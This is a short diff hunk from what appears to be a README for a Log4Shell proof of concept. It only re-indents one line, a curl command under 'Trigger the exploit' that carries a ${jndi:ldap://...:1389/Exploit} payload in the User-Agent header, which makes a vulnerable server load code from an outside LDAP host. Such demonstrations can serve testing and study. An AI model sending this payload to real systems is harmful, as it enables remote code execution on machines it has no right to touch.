@@ -27,7 +27,7 @@ python3 leak_server.py
 
 Trigger the exploit
 ```
-curl -H 'User-Agent: ${jndi:ldap://10.255.30.144:1389/Exploit}' localhost:8080
+    curl -H 'User-Agent: ${jndi:ldap://10.255.30.144:1389/Exploit}' localhost:8080
 ```
 
 ## Credits
